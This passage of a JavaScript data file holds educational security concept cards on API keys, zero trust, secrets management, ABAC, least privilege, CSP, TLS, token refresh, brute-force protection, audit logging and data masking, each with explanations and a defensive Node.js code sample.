  const cipher = crypto.createCipheriv("aes-256-gcm", masterKey, iv);
  const ct = Buffer.concat([cipher.update(plaintext, "utf8"), cipher.final()]);
  return [iv.toString("base64"), ct.toString("base64"), cipher.getAuthTag().toString("base64")].join(":");
}

function decryptField(payload) {
  const [ivB64, ctB64, tagB64] = payload.split(":");
  const decipher = crypto.createDecipheriv("aes-256-gcm", masterKey, Buffer.from(ivB64, "base64"));
  decipher.setAuthTag(Buffer.from(tagB64, "base64"));
  return Buffer.concat([decipher.update(Buffer.from(ctB64, "base64")), decipher.final()]).toString("utf8");
}

// Store: government ID is unreadable even in a full DB dump
await db.patients.insert({ name: "Ada", gov_id: encryptField("X1234567") });
console.log(decryptField(rows[0].gov_id)); // "X1234567"

// IN TRANSIT: every hop speaks TLS — including internal ones
// service -> service: https + mTLS certs (service mesh handles rotation)
// app -> db: sslmode=verify-full in the connection string`,
    steps: ["Data at rest: encrypted on disk", "Data in transit: encrypted over network", "Both layers combined", "End-to-end protection"],
  },
  {
    id: "auth-apikeys",
    cat: "auth",
    title: "API Keys",
    one: "A simple secret string identifying which app or client is calling.",
    why: "Server-to-server and developer integrations need machine identity without login flows. An API key is the lowest-friction answer: one string that says which app is calling, enabling per-client rate limits, auditing, and instant revocation.",
    how: "You generate a random token (256+ bits), store only its hash, and hand it out once. Clients send it in a header (X-API-Key or Authorization: Bearer); the server hashes the presented value and looks it up — the same pattern as password verification. Keys map to one client, one scope set, one usage record.",
    when: "Use for service-to-service calls, CLI tools, and public developer APIs. Not for end users — humans forget to rotate and paste keys into code. Pair every key with scopes and rate limits so a leaked key is an annoyance, not a breach. Rotate proactively with overlap windows.",
    ref: "Stripe Documentation",
    subtopics: [
      { name: "Hash keys at rest", detail: "Store sha256(key) — a leaked database can't be replayed against your API. Prefix keys (sk_live_, pk_) for type detection and secret scanning." },
      { name: "Scopes on every key", detail: "A read-only analytics key can't create charges. Scopes turn 'leaked key' from catastrophic to contained — define them per integration, not globally." },
      { name: "Rotate with overlap", detail: "Issue a new key while the old lives for a grace window (or support dual keys), then kill the old. Rotation you can't do safely is rotation that never happens." },
      { name: "Never in frontend code", detail: "Publishable keys exist precisely because anything in a browser bundle is public. Secret keys belong in env/vaults, and secret scanners in CI." },
    ],
    code: `const crypto = require("crypto");

// Issuance: full key shown ONCE, only its hash stored
function issueApiKey(clientName, scopes) {
  const key = "sk_live_" + crypto.randomBytes(24).toString("base64url");
  db.apiKeys.insert({
    client: clientName,
    scopes,
    keyHash: crypto.createHash("sha256").update(key).digest("hex"),
    createdAt: Date.now(),
    lastUsedAt: null,
  });
  return key; // never retrievable again
}

const key = issueApiKey("partner-acme", ["orders.read"]);

// Verification middleware: hash lookup + scope enforcement
async function requireApiKey(requiredScope) {
  return async (req, res, next) => {
    const presented = req.get("x-api-key");
    if (!presented) return res.status(401).json({ error: { code: "missing_api_key" } });

    const hash = crypto.createHash("sha256").update(presented).digest("hex");
    const record = await db.apiKeys.byHash(hash);
    if (!record || record.revokedAt) return res.status(401).json({ error: { code: "invalid_api_key" } });

    if (!record.scopes.includes(requiredScope)) {
      return res.status(403).json({ error: { code: "insufficient_scope", need: requiredScope } });
    }
    await db.apiKeys.touch(record.id); // usage audit: last used, from which IP
    req.apiClient = record;
    next();
  };
}

app.get("/v1/orders", requireApiKey("orders.read"), listOrders);`,
    steps: ["Key issued to client", "Sent with each request", "Server validates key", "Request authorized"],
  },
  {
    id: "auth-zerotrust",
    cat: "auth",
    title: "Zero Trust Architecture",
    one: "Never trust a request by default — verify every single one.",
    why: "The perimeter model ('inside the VPN = safe') dies the moment one laptop or container is compromised — attackers move laterally for weeks on trusted networks. Zero Trust assumes breach: identity and context decide access, per request, network location grants nothing.",
    how: "Every request carries verifiable identity (mTLS cert, signed token). Policy engines evaluate identity + device posture + context (time, geo, risk score) against least-privilege rules before allowing each call. Segmentation limits blast radius; continuous verification means stolen credentials expire with the session, not the perimeter.",
    when: "Aspire to it everywhere; implement incrementally — mTLS between services and short-lived tokens first, then device posture and per-request authorization. For a small team, the 80/20 is: no shared internal trust, short-lived credentials, and every service authenticating its callers.",
    ref: "NIST",
    subtopics: [
      { name: "Identity is the perimeter", detail: "Service-to-service calls authenticate with workload identities (SPIFFE certs, mTLS) — 'it came from 10.0.0.5' is not an identity." },
      { name: "Per-request authorization", detail: "Authorization runs at every call, not at login: short token TTLs, context checks (device, geo, risk), and re-evaluation on sensitive actions." },
      { name: "Micro-segmentation", detail: "Payment service accepts connections ONLY from orders, nowhere else. Blast radius of any compromise shrinks to that edge." },
      { name: "Assume breach", detail: "Design detection and containment as if the attacker is already inside: high-fidelity audit logs, anomaly alerts, and credentials that expire in minutes." },
    ],
    code: `// Zero-trust service auth: mTLS identity + per-request policy
function requireServiceIdentity(allowedCallers) {
  return (req, res, next) => {
    // 1. WHO — the TLS client cert proves the calling service, not its IP
    const cert = req.socket.getPeerCertificate();
    if (!req.socket.authorized || !cert.subject) {
      return res.status(401).json({ error: { code: "unverified_service" } });
    }
    const caller = cert.subject.CN; // e.g. "orders-service"

    // 2. WHO MAY CALL THIS — allowlist, network location grants nothing
    if (!allowedCallers.includes(caller)) {
      audit.warn("caller_not_allowed", { caller, path: req.path });
      return res.status(403).json({ error: { code: "forbidden_service" } });
    }

    // 3. FRESH PROOF — the user token inside must still be valid, now
    const claims = verifyJwt(req.get("x-user-token"), { maxAge: "5m" });
    req.caller = { service: caller, userId: claims.sub };
    audit.info("authorized_call", { caller, userId: claims.sub, path: req.path });
    next();
  };
}

paymentsApp.post("/charge", requireServiceIdentity(["orders-service", "billing-job"]), chargeHandler);
// a compromised "reports" box cannot even connect: no cert, no call.`,
    steps: ["Request arrives", "Identity verified", "Context checked", "Access granted per-request"],
  },
  {
    id: "auth-secrets",
    cat: "auth",
    title: "Secrets Management",
    one: "Storing credentials outside of code, in a dedicated vault.",
    why: "Secrets in code leak permanently: git history never forgets, CI logs echo, and one public repo mistake means rotating every credential your company owns. A vault centralizes storage, access control, and audit — and makes rotation a routine instead of an incident.",
    how: "Secrets live in a dedicated system (Vault, AWS Secrets Manager, Doppler) encrypted under keys with their own access policies. Apps authenticate to it (workload identity, not a magic string) and fetch secrets at boot or on demand; leases/TTLs mean credentials expire and rotate without redeploys.",
    when: "Any credential beyond a dev-only dummy belongs there: DB passwords, API keys, signing keys, TLS certs. The migration is cheap — one env-var read replaced by a vault call at startup. The real discipline is keeping secrets OUT of code, logs, and test fixtures in the first place.",
    ref: "HashiCorp Vault Documentation",
    subtopics: [
      { name: "Environment variables are the floor", detail: "12-factor: config in env, injected per environment. Better than code (no git history), worse than a vault (no rotation, leaks via /proc, crash dumps, CI echoes)." },
      { name: "Dynamic secrets", detail: "The vault generates short-lived DB credentials per app instance (24h TTL) — a leaked password self-destructs. No shared static password to rotate by hand." },
      { name: "Identity-based access", detail: "Apps prove WHO they are (K8s service account, cloud IAM role) to get secrets — no bootstrap secret in env at all. Access policies are auditable per secret." },
      { name: "Leak response", detail: "Secret scanners (gitleaks) in CI, git history scrubbing, and a runbook: rotate the credential, assess what it touched, fix the pipeline. Practice before the day you need it." },
    ],
    code: `const { VaultClient } = require("node-vault-like");

// Boot: authenticate by WORKLOAD identity — no secret in env at all
const vault = new VaultClient({ k8sServiceAccount: true }); // proves who we are

async function loadSecrets() {
  const [db, stripe] = await Promise.all([
    vault.read("database/creds/app"),      // DYNAMIC: fresh user/pass, 24h TTL
    vault.read("secret/data/stripe"),      // static secret, audited access
  ]);

  return {
    dbUser: db.data.username,
    dbPass: db.data.password, // expires on its own; renewal is automatic
    stripeKey: stripe.data.api_key,
  };
}

const config = await loadSecrets();
const pool = new Pool({ user: config.dbUser, password: config.dbPass });

// Renewal: leases extend while the process lives
setInterval(() => vault.renew(dbLease), 12 * 3600 * 1000);

// What NOT to do — every line below is a future incident:
// const STRIPE_KEY = "sk_live_51H..."   // in code -> in git -> public forever
// console.log("connecting with", config) // secrets in logs
// const dump = JSON.stringify(process.env); fs.writeFileSync("diag.json", dump)`,
    steps: ["App needs credential", "Requests from vault", "Vault authenticates app", "Secret returned, never hardcoded"],
  },
  {
    id: "auth-abac",
    cat: "auth",
    title: "ABAC",
    one: "Access decisions based on attributes of user, resource, and environment.",
    why: "RBAC answers 'is this user an editor?' — real systems ask 'is this user an editor OF THIS document, in THIS workspace, from a managed device?'. ABAC evaluates attributes on all sides, so policies express business truth instead of role checklists.",
    how: "A policy engine receives three attribute sets: subject (department, clearance), resource (owner, classification, project), environment (time, IP, device trust). Rules like 'allow if resource.owner == subject.id OR subject.department == resource.project.department' evaluate to allow/deny per request.",
    when: "Use when access depends on relationships or context: documents shared with specific people, resources in the tenant you belong to, actions allowed only from managed devices or business hours. Start with RBAC + ownership checks in code; adopt a policy engine (OPA/Cedar) when rules multiply across services and need central audit.",
    ref: "NIST",
    subtopics: [
      { name: "Attributes on all sides", detail: "Who (role, department, clearance), what (owner, sensitivity, tenant), when/where (device, network, time). Decisions compose from all three." },
      { name: "Policy as code", detail: "Rules live in OPA/Cedar/Rego files: versioned, testable, and reviewed like code. The same policy answers the API check and the 'why was I denied' audit." },
      { name: "Relationship checks", detail: "'Editor of this doc' is a graph edge, not a role. ABAC systems frequently blend with ReBAC (relationship-based) for exactly these checks." },
      { name: "Performance cost", detail: "Attribute lookups (owner, project membership) hit the DB per decision. Cache hot attributes and denormalize ownership onto the resource row." },
    ],
    code: `// Policy as code: evaluated per request with live attributes
const policies = [
  // Owners do everything to their own resources
  (ctx) => ctx.resource.ownerId === ctx.subject.id && ctx.action !== "delete" ? "allow" : null,
  // Same-department editors can view resources classified internal
  (ctx) =>
    ctx.action === "read" &&
    ctx.resource.classification === "internal" &&
    ctx.resource.tenantId === ctx.subject.tenantId &&
    ctx.subject.department === ctx.resource.department
      ? "allow"
      : null,
  // Admins, but only from managed devices during work hours
  (ctx) =>
    ctx.subject.roles.includes("admin") &&
    ctx.environment.deviceManaged &&
    ctx.environment.hour >= 8 && ctx.environment.hour < 20
      ? "allow"
      : null,
];

function authorize(subject, resource, action, environment) {
  const ctx = { subject, resource, action, environment };
  const decision = policies.reduce((acc, p) => acc ?? p(ctx), null) ?? "deny";
  audit.info("abac_decision", { subject: subject.id, resource: resource.id, action, decision });
  return decision; // default deny
}

console.log(
  authorize(
    { id: "u1", roles: ["member"], department: "eng", tenantId: "t1" },
    { id: "d1", ownerId: "u2", classification: "internal", department: "eng", tenantId: "t1" },
    "read",
    { deviceManaged: true, hour: 14 }
  )
); // allow`,
    steps: ["User attributes", "Resource attributes", "Policy evaluates combination", "Access allowed or denied"],
  },
  {
    id: "auth-leastprivilege",
    cat: "auth",
    title: "Least Privilege",
    one: "Every user or service gets only the access it strictly needs.",
    why: "Every unneeded permission is pre-positioned damage: the CI runner with full DB admin turns a leaked token into a dropped database. Least privilege shrinks each compromise to the minimum that component could have done — it's the multiplier on every other control.",
    how: "Start from zero and grant on evidence: what does this identity actually call? Use short-lived, scoped credentials (per-service DB users, per-action IAM roles, scoped API keys); audit actual usage; revoke what shows no traffic. Automation roles get explicit deny for destructive paths nobody automates.",
    when: "Apply to everything with credentials: humans (role granularity), services (per-service DB users), CI/CD (deploy-only, not console-admin), third-party integrations (scoped OAuth scopes). The pattern is a habit, not a project: every new credential ships with the smallest scope that works.",
    ref: "NIST",
    subtopics: [
      { name: "Per-service DB users", detail: "The billing service connects as billing_rw (its tables only), not the app owner. One compromised service can't read users.passwords or drop orders." },
      { name: "Time-bound elevation", detail: "Production access via JIT: request → approve → 1-hour admin role → auto-expire. Standing admin access is how quiet account takeovers persist." },
      { name: "Audit-driven revocation", detail: "Query access logs quarterly: permissions with zero usage in 90 days get revoked. Entropy only grows unless someone actively prunes it." },
      { name: "Deny destructive defaults", detail: "CI roles explicitly DENY drop/truncate; prod DB users deny DELETE on audit tables. Explicit denies survive accidental grant expansion." },
    ],
    code: `// Per-service database roles: the blast radius of a leaked credential
await pool.query(\`
  CREATE ROLE billing_rw NOLOGIN;
  GRANT SELECT, INSERT, UPDATE ON invoices, payments TO billing_rw;
  REVOKE DELETE ON invoices FROM billing_rw;         -- billing never deletes
  REVOKE ALL ON users, passwords_reset FROM billing_rw; -- can't even see them

  CREATE ROLE analytics_ro NOLOGIN;
  GRANT SELECT ON orders, order_items, invoices TO analytics_ro; -- read-only, fewer tables
\`);

// Each service connects as its own identity
const billingPool = new Pool({ user: "billing_rw", connectionString: process.env.BILLING_DB_URL });

// CI: deploy-only scope, explicit destructive denies
// iam: { policy: {
//   Allow: ["ecr:PutImage", "deploy:UpdateService"],
//   Deny:  ["s3:DeleteObject", "rds:DeleteDBInstance", "iam:*"]
// }}

// Quarterly entropy check: permissions nobody used
const unused = await adminPool.query(\`
  SELECT grantee, table_name, privilege_type
  FROM information_schema.role_table_grants
  WHERE grantee IN ('billing_rw','analytics_ro')
  EXCEPT
  SELECT 'billing_rw', t.tablename, 'SELECT' FROM pg_stat_user_tables t WHERE t.seq_scan + t.idx_scan > 0
\`);
console.log("candidates for revocation:", unused.rows);`,
    steps: ["Identify minimum needed access", "Grant only that", "Review periodically", "Revoke unused permissions"],
  },
  {
    id: "auth-csp",
    cat: "auth",
    title: "Content Security Policy",
    one: "A header restricting what scripts and resources a page can load.",
    why: "When one encoding slip ships an XSS, CSP is the seatbelt: the browser refuses to run injected inline scripts, load scripts from attacker domains, or exfiltrate data to unknown origins. It's the last line of defense that turns a code bug into a non-event.",
    how: "The server sends a policy listing allowed sources per resource type: script-src, style-src, img-src, connect-src, default-src. Browsers enforce it — disallowed scripts don't execute, disallowed connections fail. Nonces ('script-src 'nonce-abc123'') let your own inline scripts run while everything unmarked is blocked.",
    when: "Every HTML page deserves one, starting in report-only mode (Content-Security-Policy-Report-Only) to discover what your app actually loads without breaking it. Tighten to enforcement once reports go quiet. It doesn't replace output encoding — it catches the day encoding fails.",
    ref: "MDN Web Docs",
    subtopics: [
      { name: "Directives", detail: "default-src is the fallback; script-src, style-src, img-src, connect-src, frame-ancestors override per type. frame-ancestors 'none' is the modern anti-clickjacking." },
      { name: "Nonce over unsafe-inline", detail: "'unsafe-inline' guts the policy. Per-response nonces: generate a random value, stamp it on your <script nonce> tags, list it in the header — attacker scripts have no nonce." },
      { name: "Report-only rollout", detail: "Ship Report-Only with a report-uri/report-to endpoint; fix violations as they surface (analytics beacons, forgotten inline handlers); flip to enforce when silence holds for weeks." },
      { name: "What CSP can't do", detail: "It can't fix logic bugs, same-origin script vulns (your own compromised bundle runs fine), or stop server-side injection. It narrows the impact of XSS — one layer of several." },
    ],
    code: `const crypto = require("crypto");

// Per-response nonce: your scripts run, injected scripts cannot
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString("base64");
  const policy = [
    "default-src 'self'",
    // own bundle + this response's nonce; no eval, no inline without nonce
    "script-src 'self' 'nonce-" + res.locals.nonce + "' https://cdn.example.com",
    "style-src 'self' 'unsafe-inline'", // styles are lower risk; inline CSS allowed
    "img-src 'self' data: https://images.example.com",
    "connect-src 'self' https://api.example.com", // where fetch/XHR may go
    "object-src 'none'",
    "base-uri 'none'",
    "frame-ancestors 'none'", // nobody iframes your pages (clickjacking dead)
    "report-uri /csp-reports",
  ].join("; ");
  res.set("Content-Security-Policy", policy);
  next();
});

// Template uses the nonce:
// <script src="/app.js" nonce="<%= nonce %>"></script>

// Violation collector — every blocked injection lands here
app.post("/csp-reports", express.json({ type: "application/csp-report" }), (req, res) => {
  const report = req.body["csp-report"];
  console.log(JSON.stringify({ cspViolation: report["blocked-uri"], page: report["document-uri"] }));
  res.status(204).end();
});

// Rollout: identical policy with Report-Only header first
// res.set("Content-Security-Policy-Report-Only", policy);`,
    steps: ["Server sets CSP header", "Browser reads policy", "Blocks disallowed sources", "Only trusted content loads"],
  },
  {
    id: "auth-tls",
    cat: "auth",
    title: "HTTPS/TLS",
    one: "Encrypting traffic between client and server so it can't be read in transit.",
    why: "Unencrypted HTTP is readable and rewritable by everyone between the endpoints: Wi-Fi snoopers, ISPs, corporate proxies, nation-state taps. TLS provides confidentiality, integrity, and server identity — and browsers now flag plain HTTP as Not Secure.",
    how: "A handshake authenticates the server via its certificate (signed by a CA your client trusts) and derives ephemeral session keys via ECDHE — no key material crosses the wire. Application data then flows as encrypted, authenticated records. TLS 1.3 completes this in one round trip.",
    when: "Always, on every hop — public traffic terminated at your edge, internal service traffic re-encrypted (mTLS for zero-trust). Get certificates free via ACME (Let's Encrypt) with automated renewal; enforce with HSTS so browsers refuse to downgrade.",
    ref: "MDN Web Docs",
    subtopics: [
      { name: "Certificates prove identity", detail: "The cert binds api.example.com to a public key, chained to a trusted CA. Clients verify the chain and hostname — that's how DNS hijacks fail to impersonate you." },
      { name: "Forward secrecy", detail: "ECDHE generates per-session keys: capturing traffic today can't be decrypted even if the server's private key leaks tomorrow. All modern TLS versions have it." },
      { name: "Termination ≠ trust", detail: "TLS ending at the load balancer means the internal hop is plaintext. Encrypt inside: re-encrypt to backends, mTLS between services." },
      { name: "HSTS + preload", detail: "Strict-Transport-Security makes browsers refuse HTTP for your domain for the max-age (often 2 years) — kills downgrade and cookie-injection attacks on first-visit wifi." },
    ],
    code: `// Node server: modern TLS only
const https = require("https");
const fs = require("fs");

https
  .createServer(
    {
      key: fs.readFileSync("/etc/letsencrypt/live/app.example.com/privkey.pem"),
      cert: fs.readFileSync("/etc/letsencrypt/live/app.example.com/fullchain.pem"),
      minVersion: "TLSv1.2",
      honorCipherOrder: true,
    },
    (req, res) => res.end("secure")
  )
  .listen(443);

// Auto-renewal with ACME (greenlock/acme-client) — expiry stops being an outage
// greenlock: { agreeTos: true, email: "ops@example.com", domains: ["app.example.com"] }

// The HTTP sidecar: redirect + pin security
require("http")
  .createServer((req, res) => {
    res.writeHead(301, {
      Location: "https://" + req.headers.host + req.url,
      "Strict-Transport-Security": "max-age=63072000; includeSubDomains; preload",
    });
    res.end();
  })
  .listen(80);

// Internal hop: don't stop at the LB
// pg connection:  postgresql://...?sslmode=verify-full
// service calls:  mTLS — both sides present certificates`,
    steps: ["Handshake negotiates keys", "Channel encrypted", "Data sent securely", "Server decrypts on arrival"],
  },
  {
    id: "auth-tokenrefresh",
    cat: "auth",
    title: "Token Refresh Flow",
    one: "Issuing a short-lived access token plus a longer-lived refresh token.",
    why: "Long-lived tokens make theft profitable; short-lived tokens log users out mid-session. The refresh pattern resolves both: access tokens die in 15 minutes (a stolen one expires fast), while a secure refresh token quietly renews access until it's revoked.",
    how: "Login issues an access token (JWT, minutes) and a refresh token (opaque random, days/weeks, stored server-side or encrypted-at-rest). The client calls APIs with the access token; on 401-expiry it POSTs the refresh token to the refresh endpoint, gets new tokens, retries. Refresh is revocable: logout/rotate deletes the server-side record.",
    when: "The default pairing for SPAs and mobile apps using JWTs. Storage decides security: web apps keep refresh tokens in HttpOnly cookies; native apps use the OS secure store with rotation. Refresh-token rotation (each use issues a new refresh token and invalidates the old) detects theft — a replayed old token means stolen credentials.",
    ref: "Auth0 Documentation",
    subtopics: [
      { name: "Access token lifetime", detail: "5–15 minutes: stolen tokens have a short shelf life, and refresh traffic stays negligible (once per interval, not per request)." },
      { name: "Rotation & reuse detection", detail: "Every refresh issues a NEW refresh token; presenting an already-used one triggers theft response: revoke the whole token family, force re-login." },
      { name: "Storage per platform", detail: "Browser: refresh in HttpOnly+Secure+SameSite cookie, access in memory. Native: OS keychain. localStorage for either = one XSS away from account takeover." },
      { name: "Scope separation", detail: "Refresh endpoint only accepts refresh tokens; APIs only accept access tokens. A leaked access token can't mint new ones — that needs the refresh channel." },
    ],
    code: `const crypto = require("crypto");
const refreshTokens = new Map(); // tokenId -> { userId, expiresAt, used } (Redis in prod)

app.post("/auth/login", express.json(), async (req, res) => {
  const user = await verifyCredentials(req.body);
  if (!user) return res.status(401).end();

  const access = signJwt({ sub: user.id }, "15m");                       // short-lived
  const refreshId = crypto.randomBytes(32).toString("hex");              // opaque
  refreshTokens.set(refreshId, { userId: user.id, expiresAt: Date.now() + 30 * 864e5, used: false });

  res.cookie("refresh", refreshId, { httpOnly: true, secure: true, sameSite: "strict", path: "/auth/refresh" });
  res.json({ accessToken: access });
});

app.post("/auth/refresh", (req, res) => {
  const id = req.cookies.refresh;
  const record = refreshTokens.get(id);
  if (!record || record.expiresAt < Date.now()) return res.status(401).end();

  if (record.used) {
    // REUSE = theft signal: kill the whole family, force re-login
    for (const [key, r] of refreshTokens) if (r.userId === record.userId) refreshTokens.delete(key);
    return res.status(401).json({ error: { code: "token_reuse_detected" } });
  }

  record.used = true; // rotate: this one can never mint again
  const newRefresh = crypto.randomBytes(32).toString("hex");
  refreshTokens.set(newRefresh, { userId: record.userId, expiresAt: record.expiresAt, used: false });
  res.cookie("refresh", newRefresh, { httpOnly: true, secure: true, sameSite: "strict", path: "/auth/refresh" });
  res.json({ accessToken: signJwt({ sub: record.userId }, "15m") });
});`,
    steps: ["Access token issued (short-lived)", "Expires", "Refresh token used", "New access token issued"],
  },
  {
    id: "auth-bruteforce",
    cat: "auth",
    title: "Brute-Force Protection",
    one: "Locking or slowing an account after repeated failed login attempts.",
    why: "Password hashing makes offline cracks slow — brute-force protection makes ONLINE guessing slow and loud. Without it, attackers try millions of passwords against your login endpoint for free; with it, guessing costs minutes per attempt and trips alarms.",
    how: "Track failures per account, per IP, and per IP-range with sliding windows. Exceed thresholds and: add artificial delay, serve CAPTCHA, or require a cool-down. Crucially, respond identically for wrong-password and no-such-user, and make locks expire automatically to avoid a denial-of-service weapon.",
    when: "Every credential endpoint: login, password reset, MFA verification, API key validation. Combine with password hashing (offline cost) and breach-password checks ('is this in the top million leaked?'). Exponential backoff per account (1, 2, 4, 8... seconds) beats hard locks — no user-lockout DoS for attackers.",
    ref: "OWASP",
    subtopics: [
      { name: "Per-account + per-IP windows", detail: "Track both: per-account stops distributed guessing at one user; per-IP stops one source spraying everyone. attacker-only-per-account tracking is trivially bypassed." },
      { name: "Progressive delay > lockout", detail: "Exponential backoff punishes guessers without handing attackers a 'lock out any user forever' button. Hard locks need admin review and user notification." },
      { name: "Uniform responses", detail: "Wrong password vs unknown email must be indistinguishable (same message, same timing) or enumeration leaks which accounts exist — gold for credential stuffing." },
      { name: "Credential stuffing reality", detail: "Most attacks replay leaked username/password pairs. Defenses: check passwords against breach corpora, require MFA on suspicious logins, monitor failure-rate anomalies." },
    ],
    code: `const attempts = new Map(); // key -> timestamps of recent failures

function key(...parts) { return parts.join("|"); }

function registerFailure(identifier, ip) {
  const now = Date.now();
  for (const k of [key("acct", identifier), key("ip", ip)]) {
    const list = (attempts.get(k) ?? []).filter((t) => now - t < 15 * 60 * 1000); // 15 min window
    list.push(now);
    attempts.set(k, list);
  }
}

function backoffMs(identifier, ip) {
  const recent = (k) => (attempts.get(k) ?? []).length;
  const fails = Math.max(recent(key("acct", identifier)), recent(key("ip", ip)));
  if (fails < 3) return 0;
  // 3 fails -> 2s, 4 -> 4s, 5 -> 8s ... capped at 30s
  return Math.min(2 ** (fails - 2) * 1000, 30000);
}

app.post("/login", express.json(), async (req, res) => {
  const wait = backoffMs(req.body.email, req.ip);
  if (wait > 0) await new Promise((r) => setTimeout(r, wait)); // progressive delay
  if (backoffMs(req.body.email, req.ip) >= 30000) {
    return res.status(429).json({ error: { code: "try_again_later" } });
  }

  const user = await verifyCredentials(req.body.email, req.body.password); // uniform error path
  if (!user) {
    registerFailure(req.body.email, req.ip);
    return res.status(401).json({ error: { code: "invalid_credentials" } }); // same as unknown-email
  }
  res.json({ token: issueSession(user) });
});`,
    steps: ["Failed login", "Counter increments", "Threshold exceeded", "Account locked or delayed"],
  },
  {
    id: "auth-auditlog",
    cat: "auth",
    title: "Audit Logging",
    one: "Recording who did what and when, for security review.",
    why: "When a breach or insider incident lands, the questions are forensic: who accessed this record, when, from where, what changed? Audit logs answer — and their existence deters misuse. Compliance regimes (SOC 2, HIPAA, PCI) make them non-optional.",
    how: "Security-relevant events write immutable, structured records: actor (user AND service), action, target resource, before/after for mutations, source IP, timestamp, request ID. They ship to append-only storage (WORM bucket, log service) that the application cannot edit or delete.",
    when: "Log the sensitive perimeter: auth events (login, logout, MFA changes, password resets), permission grants, data exports, admin actions, PII access (GDPR reads), configuration changes. Don't log secrets or bulk content — log the fact and the pointer, not the payload.",
    ref: "NIST",
    subtopics: [
      { name: "Append-only storage", detail: "App credentials get INSERT-only on the audit sink; retention locks (S3 Object Lock) prevent even admins rewriting history. Tamper-evidence is the point." },
      { name: "Actor + action + target + delta", detail: "The minimal useful record: WHO did WHAT to WHICH resource, with before/after values for mutations. Without the delta, audits can't answer 'what did they see/change'." },
      { name: "Alerting on patterns", detail: "Logs become security when watched: impossible-travel logins, mass exports, off-hours admin actions, privilege escalation chains — alert on these, not just incidents." },
      { name: "Correlation IDs", detail: "Every audit entry carries the request ID tying it to application logs and traces — reconstructing an incident means joining all three views." },
    ],
    code: `const audit = (event) =>
  fetch("https://logs.example.com/audit", {
    method: "POST",
    headers: { Authorization: "Bearer " + process.env.AUDIT_TOKEN }, // INSERT-only permission
    body: JSON.stringify({
      ...event,
      ts: new Date().toISOString(),
      service: "orders-api",
    }),
  });

// A permission grant — the before/after is the whole story
async function grantRole(adminUser, targetUser, role) {
  const before = await db.roles.for(targetUser.id);
  await db.roles.add(targetUser.id, role);
  const after = await db.roles.for(targetUser.id);

  await audit({
    type: "role.granted",
    actor: { id: adminUser.id, ip: adminUser.ip },
    subject: { id: targetUser.id },
    change: { role, before, after },
    requestId: adminUser.requestId,
  });
}

// PII access — GDPR asks WHO viewed this customer's data
await audit({
  type: "pii.read",
  actor: { id: req.userId, ip: req.ip },
  subject: { id: customerId },
  fields: ["email", "address"],
  purpose: req.query.purpose ?? "support-ticket",
});

// Login with impossible travel detection
const prev = await lastLogin(user.id);
if (prev && distanceKm(prev.geo, req.geo) / hoursBetween(prev.ts, Date.now()) > 900) {
  audit({ type: "auth.anomaly", detail: "impossible_travel", actor: { id: user.id } });
}`,
    steps: ["Action performed", "Logged with actor & timestamp", "Stored immutably", "Reviewed on incident"],
  },
  {
    id: "auth-authnvsauthz",
    cat: "auth",
    title: "Authentication vs Authorization",
    one: "Authentication proves who you are; authorization decides what you can do.",
    why: "Conflating them produces both classic bugs: endpoints that check login but never permission (any user reads any tenant), and permission checks that assume identity was verified. Every secure request answers two separate questions, in order.",
    how: "Authentication happens once per session/request: verify credentials, session, or token signature — output is an identity (userId, service id). Authorization happens per action: given that identity, is THIS operation on THIS resource allowed? Different lifetimes, different failure codes (401 vs 403), different code paths.",
    when: "Architect them as separate middleware: authenticate() resolves req.user or 401s; authorize(permission, resource) or 403s. Test the gap: every endpoint deserves an 'authenticated but forbidden' case, and every tenant-scoped query a cross-tenant attempt.",
    ref: "OWASP",
    subtopics: [
      { name: "401 vs 403", detail: "401: who are you? (missing/invalid credentials, retry after login). 403: I know you, you can't do this. Returning 404 instead of 403 also hides resource existence." },
      { name: "The broken object level", detail: "The #1 API vuln (OWASP API1): authenticated user requests /orders/999 — someone else's. Authn passed; the missing per-object authz check is the breach." },
      { name: "Once vs everywhere", detail: "Identity authenticates at the edge (session, JWT verify); authorization must run at EVERY action including background jobs — trust decays with distance from the edge." },
      { name: "Machine identity too", detail: "Services authenticate to each other (mTLS, service tokens) and then authorize: can billing read this table? Same two questions, same order." },
    ],
    code: `// Layer 1: AUTHENTICATION — once, at the edge. Produces identity or 401.
async function authenticate(req, res, next) {
  try {
    const token = (req.get("authorization") ?? "").replace("Bearer ", "");
    req.user = await verifyJwt(token); // throws if invalid/expired
    next();
  } catch {
    res.status(401).json({ error: { code: "unauthenticated" } });
  }
}

// Layer 2: AUTHORIZATION — per action, per resource. Produces allow or 403.
function authorize(permission, getResource) {
  return async (req, res, next) => {
    const resource = await getResource(req); // e.g. load the order by :id
    if (!resource) return res.status(404).json({ error: { code: "not_found" } });

    const allowed =
      can(req.user, permission) && resource.userId === req.user.sub; // role AND ownership
    if (!allowed) return res.status(403).json({ error: { code: "forbidden" } });

    req.resource = resource;
    next();
  };
}

// Both, always, in order:
app.delete(
  "/orders/:id",
  authenticate,
  authorize("orders.delete", (req) => db.orders.find(req.params.id)),
  deleteOrder
);

// The OWASP API1 attack this stops:
// authed user u2 -> DELETE /orders/<u1-order-id>  -> 403 (ownership check)`,
    steps: ["Authenticate (prove identity)", "Identity confirmed", "Authorize (check permissions)", "Action allowed or denied"],
  },
  {
    id: "auth-datamasking",
    cat: "auth",
    title: "Data Masking",
    one: "Hiding or obfuscating sensitive fields in logs and non-production environments.",
    why: "Logs, staging databases, and support tools all need SOME of the data — and each is a leak surface with weaker controls than production. Masking keeps shapes and realism (emails look like emails) while making the values useless to an attacker.",
    how: "Two techniques: redaction (remove/replace: 4242-...-1234 → ****1234, drop fields before logging) and deterministic pseudo-anonymization (hash or format-preserving fake: ada@ex.com → user_7f3a@example.invalid) so correlation still works in analytics without exposing real people.",
    when: "Default-deny in logs (redact unless explicitly allowlisted), mask ALL non-prod databases (real PII in staging is a compliance incident), and scope raw values in admin tools by permission with audit logging. Mask at the serialization boundary so new log lines are safe by construction.",
    ref: "OWASP",
    subtopics: [
      { name: "Log redaction", detail: "An allowlist serializer: only approved fields pass to logs; emails become u7f3a@…, cards ****1234. One choke point beats remembering per log call." },
      { name: "Non-prod data masking", detail: "Staging gets production-shaped fake data (Faker + deterministic mapping). Real PII in staging is a breach with extra steps and no security budget." },
      { name: "Format-preserving masking", detail: "Keep validity: masked card passes the Luhn check display (**** **** **** 1234), masked phone stays phone-shaped — support tools and tests keep working." },
      { name: "Deterministic pseudonyms", detail: "Same input → same fake (HMAC with an env-held key): analytics can still join on user identity without holding the real identifier." },
    ],
    code: `const crypto = require("crypto");
const MASK_KEY = process.env.MASK_KEY; // held outside the logging system

